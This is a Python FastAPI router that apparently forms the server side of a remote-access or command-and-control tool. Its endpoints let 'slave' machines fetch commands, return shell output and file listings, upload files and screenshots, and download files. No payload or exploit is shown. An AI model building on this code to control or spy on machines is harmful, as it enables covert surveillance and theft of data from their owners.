from fastapi import APIRouter, Request, UploadFile, HTTPException
import service as Service
import os
from fastapi.responses import FileResponse
from models import SlaveCommandRequest, SlaveTextOutputRequest, SlaveFileBrowseOutputRequest

slave = APIRouter(
    prefix="/slave"
)

@slave.post("/command")
async def command(request: Request, slave_command: SlaveCommandRequest):
    return Service.get_slave_command(request,slave_command)
    
@slave.post("/response/text")
async def textresponse(slave_text_op_req : SlaveTextOutputRequest):
    return Service.set_slave_shell_command_output(slave_text_op_req)

@slave.post("/response/filebrowse")
async def filebrowseresponse(slave_file_browse_op_req : SlaveFileBrowseOutputRequest):
    return Service.set_slave_file_browse_command_output(slave_file_browse_op_req)
    
@slave.post("/response/file")
async def fileresponse(mac: str, file: UploadFile):
    return Service.save_slave_file_upload(mac,file)

@slave.post("/response/screenshot")
async def screenshotresponse(mac: str, file: UploadFile):
    return Service.save_screenshot_from_slave(mac, file)

@slave.get("/files/{folder}/{filename}/hash")
async def getfilehash(folder, filename):
    try:
        resp = Service.get_file_hash(folder, filename)
        return resp
    except:
        raise HTTPException(status_code=404, detail="Item not found")

@slave.get("/files/{folder}/{filename}/download")
async def getfiledownload(folder, filename):
    try:
        full_file_path = Service.get_file_download(folder, filename)
        if os.path.isfile(full_file_path):
            return FileResponse(path=full_file_path, filename = filename)
        else:
            raise HTTPException(status_code=404, detail="Item not found")
    except:
        raise HTTPException(status_code=404, detail="Item not found")